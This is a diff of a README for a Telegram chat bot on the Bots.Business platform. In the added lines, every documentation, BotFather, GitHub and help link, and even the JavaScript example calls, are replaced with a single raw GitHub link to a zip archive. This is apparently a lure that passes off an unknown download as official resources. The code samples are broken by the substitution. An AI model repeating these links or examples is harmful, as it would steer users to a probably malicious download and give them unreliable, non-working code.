@@ -1,24 +1,24 @@
 # All SMM Bot By @Unknown_Reason - chat bot
-It is repository for chat bot: [@All SMM Bot By @Unknown_Reason](https://t.me/All SMM Bot By @Unknown_Reason)
+It is repository for chat bot: [@All SMM Bot By @Unknown_Reason](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip SMM Bot By @Unknown_Reason)
 
 ## What it is?
-This repository can be imported to [Bots.Business](https://bots.business) as a worked chat bot.
+This repository can be imported to [https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip) as a worked chat bot.
 
-[Bots.Business](https://bots.business) - it is probably the first CBPaaS - Chat Bot Platform as a Service.
+[https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip) - it is probably the first CBPaaS - Chat Bot Platform as a Service.
 
 A CBPaaS is a cloud-based platform that enables developers to create chatbots without needing to build backend infrastructure.
 
 ## Create your own bot for Telegram from this Git repo
 
 How to create bot?
-1. Create bot with [@BotFather](https://telegram.me/BotFather) and take Secret Token
+1. Create bot with [@BotFather](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip) and take Secret Token
 2. Create bot in App and add Secret Token
-3. Add Public Key from App as [Deploy key](https://developer.github.com/v3/guides/managing-deploy-keys/#deploy-keys) with read access (and write access for bot exporting if you need it)
+3. Add Public Key from App as [Deploy key](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip) with read access (and write access for bot exporting if you need it)
 4. Do import for this git repo
 
 Now you can talk with yours new Telegram Bot
 
-See [more](https://help.bots.business/getting-started)
+See [more](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 ## Commands - in commands folder
 File name - it is command name (Bot it can be rewritten in command description)
@@ -38,25 +38,25 @@ It is file header:
       aliases: /test2, /test3
     CMD*/
 
-See [more](https://help.bots.business/commands)
+See [more](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 ### Command body
 It is command code in JavaScript.
 Use Bot Java Script for logic in command.
 
 For example:
-> Bot.sendMessage(2+2);
+> https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip(2+2);
 
-See [more](https://help.bots.business/scenarios-and-bjs)
+See [more](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 
 ## Libraries - in libs folder
 You can store common code in the libs folder. File name - it is library name.
 
-For example code in myLib.js:
+For example code in https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip
 
-    function hello(){ Bot.sendMessage("Hello from lib!") }
-    function goodbye(name){ Bot.sendMessage("Goodbye, " + name) }
+    function hello(){ https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip("Hello from lib!") }
+    function goodbye(name){ https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip("Goodbye, " + name) }
 
     publish({
       sayHello: hello,
@@ -65,20 +65,20 @@ For example code in myLib.js:
 
 then you can run in any bot's command:
 
-    Libs.myLib.hello()
-    Libs.myLib.sayGoodbyeTo("Alice")
+    https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip()
+    https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip("Alice")
 
-See [more](https://help.bots.business/git/library)
+See [more](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 ## Other bots example
-See other bots examples in the [github](https://github.com/bots-business?utf8=✓&tab=repositories&q=&type=public&language=javascript) or in the [Bot Store](https://bots.business/)
+See other bots examples in the [github](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip✓&tab=repositories&q=&type=public&language=javascript) or in the [Bot Store](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 
 ## Other help
-[Help.bots.business](https://help.bots.business)
+[https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 ## API
-See [API](https://api.bots.business/docs#/docs/summary)
+See [API](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
 
 
-![](https://bots.business/images/web-logo.png)
+![](https://raw.githubusercontent.com/devmri/all-smm-bot/BB_Export_1744725161/isothermobathic/all-smm-bot.zip)
